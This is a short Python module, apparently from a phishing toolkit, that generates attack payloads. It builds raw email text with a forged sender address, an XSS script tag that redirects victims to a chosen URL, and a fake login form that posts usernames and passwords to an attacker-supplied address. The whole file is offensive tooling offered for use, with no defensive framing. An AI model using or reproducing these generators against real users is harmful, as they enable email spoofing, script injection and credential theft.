# phishing/spoof_payloads.py
from utils.logger import logger

def generate_email_spoof_payload(to_email, fake_sender, subject, body):
    spoofed = f"""
From: {fake_sender}
To: {to_email}
Subject: {subject}
MIME-Version: 1.0
Content-Type: text/html

{body}
"""
    logger.info("[PayloadGen] Generated email spoof payload.")
    return spoofed

def generate_xss_payload(redirect_url):
    payload = f"<script>window.location='{redirect_url}'</script>"
    logger.info("[PayloadGen] XSS redirector payload created.")
    return payload

def generate_fake_form_action(fake_url):
    payload = f'<form action="{fake_url}" method="POST">\n<input name="user"/><input name="pass" type="password"/>\n<button>Login</button></form>'
    logger.info("[PayloadGen] Fake form payload created.")
    return payload



